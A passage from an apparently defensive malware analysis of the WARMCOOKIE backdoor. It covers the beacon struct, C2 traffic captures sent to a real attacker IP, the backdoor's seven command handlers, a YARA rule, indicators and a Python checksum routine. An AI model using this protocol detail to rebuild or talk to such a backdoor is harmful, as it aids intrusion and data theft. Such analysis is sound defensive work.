struct initial_request
{
    int checksum_c2_message_data;
    int checksum_volume_mutex;
    int checksum_computer_name_username;
    request_type request_type;
    os_info os_ver;
    int offset_to_dns_domain;
    int size_base64_dns_domain;
    int offset_to_base64_computer_name;
    int size_base64_computer_name;
    int offset_to_base64_username;
    int size_base64_username;
    char base64_dns_domain[]; // Variable-length array
    char base64_username[]; // Variable-length array
    char base64_computer_name[]; // Variable-length array 
};</code></pre>
<p>The first request to the C2 server is sent through a GET request using User Agent: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705</code>.</p>
<pre><code>GET http://185.49.69[.]41/ HTTP/1.1
Cookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=
User-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)
Host: 185.49.69[.]41
Connection: Keep-Alive
Pragma: no-cache</code></pre>
<p>Below is the CyberChef recipe of the HTTP cookie parameter decrypted from the first request, followed by a legend of the fields:</p>
<p></p>
<p></p>
<p>WARMCOOKIE inserts a few integrity checks by generating hashes using the previously described checksum function. For example, the data in the decrypted HTTP cookie parameter from the 4th byte to the end is hashed and placed at the beginning (offset 0). Using the example above, this checksum value is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xe51387e9</code></p>
<p>Before the malware can receive instructions, integrity checks are also used to verify the incoming response from the C2 server. In this scenario, the C2 server produces the expected checksum for the data sent to the victim machine. This is located in the first four bytes of the request.</p>
<p></p>
<p>Below is a demonstration of this integrity check where the request data’s hash is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x50d26cc3</code>.</p>
<p></p>
<p>If the checksum matches, WARMCOOKIE reads the command ID at the 8th-byte offset of the request to proceed to move to the next command handler.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="bot-functionality" class="absolute -top-32"></span>Bot functionality</h3>
<p>WARMCOOKIE provides 7 command handlers for threat actors to retrieve additional victim information, record screenshots, launch additional payloads, etc. The provided functionality is relatively straightforward, allowing threat groups that need a lightweight backdoor to monitor victims and deploy further damaging payloads such as ransomware.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Command ID</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td>Retrieve victim details</td></tr><tr><td>2</td><td>Record screenshots of victim machine</td></tr><tr><td>3</td><td>Retrieve installed programs via Uninstall registry path</td></tr><tr><td>4</td><td>Command-line execution (cmd.exe /c)</td></tr><tr><td>5</td><td>Write file to victim machine</td></tr><tr><td>6</td><td>Read file from victim machine</td></tr><tr><td>10</td><td>Delete scheduled task persistence</td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="retrieve-victim-details---command-id-1" class="absolute -top-32"></span>Retrieve victim details - command ID (1)</h4>
<p>This handler fingerprints and identifies the victim machines by collecting the IP address and CPU information. Interestingly, the imports required for this handler are statically imported.</p>
<p></p>
<p>The malware uses HTTP <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">POST</code> requests when sending data back to the C2 server. The HTTP POST request data is encrypted via RC4 and sent over the network in raw form. In addition, the IP address and CPU information are Base64 encoded.</p>
<pre><code>POST http://185.49.69[.]41/ HTTP/1.1
Cookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=
User-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)
Host: 185.49.69.41
Content-Length: 136
Connection: Keep-Alive
Pragma: no-cache

  qI:f*m  yڂ  z ? !  ,!w   k i A  K    k8 .(M ޣ&gt; ދ  u[ôz  0 -U~    9 z G(  *X  o_  _      * Y, q  glTs   XI8b\)W   W&quot;</code></pre>
<p>After decrypting the HTTP POST request data, this presents a similar structure as before, where the data is front-loaded with the checksum values, offsets, and sizes to the pertinent information targeted by the handler. In this case, the Base64 encoded data is the IP Address and CPU info.</p>
<p></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Encoded Value</th><th>Decoded Value</th></tr></thead><tbody><tr><td>MTkyLjE2OC4xODIuMTMx</td><td>192.168.182.131</td></tr><tr><td>QU1EIFJ5emVuIDcgNzgwMFgzRCA4LUNvcmUgUHJvY2Vzc29yICAgICAgICAgICA=</td><td>AMD Ryzen 7 7800X3D 8-Core Processor</td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="screenshot-capture---command-id-2" class="absolute -top-32"></span>Screenshot capture - command ID (2)</h4>
<p>The ability to capture screenshots from victim machines provides a wide range of malicious options, such as stealing sensitive information displayed on the screen or actively monitoring the victim’s machine. This handler dynamically loads Windows DLLs used for graphics and drawing operations, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GDI32.DLL</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GDIPLUS.DLL</code>, and then uses various APIs, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">BitBlt</code>,<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CreateCompatibleBitmap</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetSystemMetrics</code> to generate the screenshot.</p>
<p></p>
<p>The collected screenshot is encrypted with RC4 and sent through a POST request along with the checksum data.</p>
<p></p>
<p>By looking for the file header <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">JPEG File Interchange Format (JFIF)</code>, we can carve out the image, and find a high-quality image of our sandbox machine (below) based on our request to this handler.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="retrieve-installed-programs---command-id-3" class="absolute -top-32"></span>Retrieve installed programs - command ID (3)</h4>
<p>This handler enumerates the installed programs on the victim machine via the registry key:</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</code></pre>
<p></p>
<p>The program&#x27;s name, version, and installation date are Base64 encoded and placed into a pipe-delimited format along with the checksum data, offsets, and sizing.</p>
<p></p>
<p>Below is an example of one of the registry entries:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Encoded Value</th><th>Decoded Value</th></tr></thead><tbody><tr><td>Ny1aaXAgMTguMDEgKHg2NCk=</td><td>7-Zip 18.01 (x64)</td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="command-line-execution---command-id-4" class="absolute -top-32"></span>Command-line execution - command ID (4)</h4>
<p>WARMCOOKIE uses this handler to provide backdoor access to the victim machine. The operator provides an argument that gets executed to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cmd.exe /c </code>without a console window.</p>
<p></p>
<p>In the example below, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">whoami</code> is provided as the argument:</p>
<p></p>
<p>This function reads the output from the provided command and stores it in Base64, where it’s sent back to the C2 server. Below is an example of the decrypted data for this handler:</p>
<p></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Encoded Value</th><th>Decoded Value</th></tr></thead><tbody><tr><td>ZGVza3RvcC0yYzNpcWhvXHJlbQ0K</td><td>desktop-2c3iqho\rem</td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="write-file---command-id-5" class="absolute -top-32"></span>Write file - command ID (5)</h4>
<p>WARMCOOKIE can drop files on the victim machine; the threat actors provide the file path and file data.</p>
<p></p>
<p>As a test, we can write a file within a directory with some data and then read it in the next handler.</p>
<p></p>
<p></p>
<p>Depending on the file write result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">OK</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ERROR: Cannot write file</code></li>
</ul>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="read-file---command-id-6" class="absolute -top-32"></span>Read file - command ID (6)</h4>
<p>This handler can read file content from machines infected with WARMCOOKIE. The threat actor needs to provide the file path as the argument.</p>
<p></p>
<p>Depending on the file read result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values along with the file contents:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">OK (See &#x27;Files&#x27; tab)</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ERROR: Cannot read file</code></li>
</ul>
<p></p>
<p>Based on the previous wording around a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Files</code> tab, the WARMCOOKIE operators may use a GUI element.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="remove-persistence---command-id-10" class="absolute -top-32"></span>Remove persistence - command ID (10)</h4>
<p>This handler removes the previously configured scheduled task with the name <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RtlUpd</code>. By leveraging COM, it will call <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DeleteFileW</code> within <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mstask.dll</code> to remove the task.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="ida-string-decryption-tool" class="absolute -top-32"></span>IDA string decryption tool</h2>
<p>Elastic Security Labs is releasing an IDAPython script used to decrypt strings from WARMCOOKIE. The decrypted strings will be placed in the IDA Pro decompiler helping analysts identify key functionality. The string decryption and IDA commenting tool can be downloaded <a href="https://github.com/elastic/labs-releases/tree/main/tools/warmcookie">here</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>WARMCOOKIE is a newly discovered backdoor that is gaining popularity and is being used in campaigns targeting users across the globe. Our team believes this malware represents a formidable threat that provides the capability to access target environments and push additional types of malware down to victims. While there is room for improvement on the malware development side, we believe these minor issues will be addressed over time. Elastic Security Labs will continue to monitor this threat and recommends that the industry do the same.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="warmcookie-and-mitre-attck" class="absolute -top-32"></span>WARMCOOKIE and MITRE ATT&amp;CK</h2>
<p>Elastic uses the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="tactics" class="absolute -top-32"></span>Tactics</h3>
<p>Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.</p>
<ul>
<li><a href="https://attack.mitre.org/tactics/TA0001">Initial Access</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0002/">Execution</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0005/">Defense Evasion</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0007">Discovery</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0011">Command and Control</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0010/">Exfiltration</a></li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="techniques" class="absolute -top-32"></span>Techniques</h3>
<p>Techniques represent how an adversary achieves a tactical goal by performing an action.</p>
<ul>
<li><a href="https://attack.mitre.org/techniques/T1566/">Phishing</a></li>
<li><a href="https://attack.mitre.org/techniques/T1204/001/">User Execution: Malicious Link</a></li>
<li><a href="https://attack.mitre.org/techniques/T1059/001/">Command and Scripting Interpreter: PowerShell</a></li>
<li><a href="https://attack.mitre.org/techniques/T1082/">System Information Discovery</a></li>
<li><a href="https://attack.mitre.org/techniques/T1053/">Scheduled Task/Job</a></li>
<li><a href="https://attack.mitre.org/techniques/T1113/">Screen Capture</a></li>
<li><a href="https://attack.mitre.org/techniques/T1059/003/">Command and Scripting Interpreter: Windows Command Shell</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="preventing-and-detecting-warmcookie" class="absolute -top-32"></span>Preventing and detecting WARMCOOKIE</h2>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="prevention" class="absolute -top-32"></span>Prevention</h3>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_downloads.toml">Suspicious PowerShell Downloads</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml">Scheduled Task Creation by an Unusual Process</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_execution.toml">Suspicious PowerShell Execution via Windows Scripts</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/defense_evasion_rundll32_regsvr32_loads_a_dll_downloaded_via_bits.toml">RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_rundll32_with_unusual_arguments.toml">RunDLL32 with Unusual Arguments</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar">Windows.Trojan.WarmCookie</a></li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="detection-wyara" class="absolute -top-32"></span>Detection w/YARA</h3>
<p>Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar">WARMCOOKIE</a>:</p>
<pre><code>rule Windows_Trojan_WarmCookie_7d32fa90 {
    meta:
        author = &quot;Elastic Security&quot;
        creation_date = &quot;2024-04-29&quot;
        last_modified = &quot;2024-05-08&quot;
        os = &quot;Windows&quot;
        arch = &quot;x86&quot;
        threat_name = &quot;Windows.Trojan.WarmCookie&quot;
        license = &quot;Elastic License v2&quot;

     strings:
        $seq_checksum = { 45 8D 5D ?? 45 33 C0 41 83 E3 ?? 49 8D 4E ?? 44 03 DB 41 8D 53 ?? }
        $seq_string_decrypt = { 8B 69 04 48 8D 79 08 8B 31 89 6C 24 ?? 48 8D 4E ?? E8 }
        $seq_filesearch = { 48 81 EC 58 02 00 00 48 8B 05 82 0A 02 00 48 33 C4 48 89 84 24 40 02 00 00 45 33 C9 48 8D 44 24 30 45 33 C0 48 89 44 24 20 33 C9 41 8D 51 1A FF 15 83 4D 01 00 85 C0 78 22 48 8D 4C 24 30 E8 1D }
        $seq_registry = { 48 81 EC 80 02 00 00 48 8B 05 F7 09 02 00 48 33 C4 48 89 84 24 70 02 00 00 4C 89 B4 24 98 02 00 00 48 8D 0D 4D CA 01 00 45 33 F6 41 8B FE E8 02 4F 00 00 48 8B E8 41 B9 08 01 00 00 48 8D 44 24 }
        $plain_str1 = &quot;release.dll&quot; ascii fullword
        $plain_str2 = &quot;\&quot;Main Invoked.\&quot;&quot; ascii fullword
        $plain_str3 = &quot;\&quot;Main Returned.\&quot;&quot; ascii fullword
        $decrypt_str1 = &quot;ERROR: Cannot write file&quot; wide fullword
        $decrypt_str2 = &quot;OK (No output data)&quot; wide fullword
        $decrypt_str3 = &quot;OK (See &#x27;Files&#x27; tab)&quot; wide fullword
        $decrypt_str4 = &quot;cmd.exe /c %ls&quot; wide fullword
        $decrypt_str5 = &quot;Cookie:&quot; wide fullword
        $decrypt_str6 = &quot;%ls\\*.*&quot; wide fullword
    condition:
        (3 of ($plain*)) or (2 of ($seq*)) or 4 of ($decrypt*)
}</code></pre>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="observations" class="absolute -top-32"></span>Observations</h2>
<p>All observables are also available for <a href="https://github.com/elastic/labs-releases/tree/main/indicators/warmcookie">download</a> in both ECS and STIX format.</p>
<p>The following observables were discussed in this research.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Observable</th><th>Type</th><th>Name</th><th>Reference</th></tr></thead><tbody><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ccde1ded028948f5cd3277d2d4af6b22fa33f53abde84ea2aa01f1872fad1d13</code></td><td>SHA-256</td><td>RtlUpd.dll</td><td>WARMCOOKIE</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">omeindia[.]com</code></td><td>domain</td><td></td><td>Phishing link</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">assets.work-for[.]top</code></td><td>domain</td><td></td><td>Landing page</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45.9.74[.]135</code></td><td>ipv4-addr</td><td></td><td>Landing page</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80.66.88[.]146</code></td><td>ipv4-addr</td><td></td><td>WARMCOOKIE C2 server</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">185.49.69[.]41</code></td><td>ipv4-addr</td><td></td><td>WARMCOOKIE C2 server</td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="references" class="absolute -top-32"></span>References</h2>
<p>The following were referenced throughout the above research:</p>
<ul>
<li><a href="https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign">https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign</a></li>
<li><a href="https://x.com/Cryptolaemus1/status/1785423804577034362">https://x.com/Cryptolaemus1/status/1785423804577034362</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="appendix" class="absolute -top-32"></span>Appendix</h2>
<p><strong>Checksum example</strong></p>
<pre><code>def calculate_checksum(str_input, str_len, i):
    if i == 0:
        i = 0xFFFFFFFF
    if i == -1:
        i = 0

    for idx in range(0, str_len, 2):
        v6 = str_input[idx] | (str_input[idx + 1] &lt;&lt; 8)
        for _ in range(16):
            if (v6 ^ i) &amp; 1:
                i = ((i &gt;&gt; 1) ^ 0xEDB88320) &amp; 0xFFFFFFFF
            else:
                i = (i &gt;&gt; 1) &amp; 0xFFFFFFFF
            v6 &gt;&gt;= 1

    return ~i &amp; 0xFFFFFFFF


serial_volume = 0x0A2C9AD2F

mutex = &quot;f92e6f3c-9cc3-4be0-966c-1be421e69140&quot;.encode(&quot;utf-16le&quot;)
mutex_result = calculate_checksum(mutex, len(mutex), -1)

username = &quot;REM\x00&quot;.encode(&quot;utf-16le&quot;)
username_result = calculate_checksum(username, len(username), -1)

computer_name = &quot;DESKTOP-2C3IQHO&quot;.encode(&quot;utf-16le&quot;)
computer_name_result = calculate_checksum(computer_name, len(computer_name), -1)

print(f&quot;Mutex: {hex(mutex_result)}&quot;)
print(f&quot;Username: {hex(username_result)}&quot;)
print(f&quot;Computer Name: {hex(computer_name_result)}&quot;)
print(f&quot;#1 Checksum: {hex(serial_volume ^ mutex_result)}&quot;)
print(f&quot;#2 Checksum: {hex(username_result ^ computer_name_result)}&quot;)</code></pre></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/dipping-into-danger#warmcookie-at-a-glance"><span>WARMCOOKIE at a&nbsp;glance</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/dipping-into-danger#key-takeaways"><span>Key&nbsp;takeaways</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/dipping-into-danger#ref6127-campaign-overview"><span>REF6127 campaign&nbsp;overview</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/dipping-into-danger#ref6127-infrastructure-overview"><span>REF6127 infrastructure&nbsp;overview</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/dipping-into-danger#warmcookie-malware-anlaysis"><span>WARMCOOKIE malware&nbsp;anlaysis</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/dipping-into-danger#stage-1"><span>Stage&nbsp;1</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/dipping-into-danger#persistence"><span>Persistence</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/dipping-into-danger#stage-2"><span>Stage&nbsp;2</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/dipping-into-danger#obfuscation-"><span>Obfuscation&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/dipping-into-danger#dynamic-api-loading"><span>Dynamic API&nbsp;loading</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Dipping into Danger: The WARMCOOKIE backdoor&amp;url=https://www.elastic.co/security-labs/dipping-into-danger" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/dipping-into-danger" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/dipping-into-danger&amp;title=Dipping into Danger: The WARMCOOKIE backdoor" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/dipping-into-danger&amp;title=Dipping into Danger: The WARMCOOKIE backdoor" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 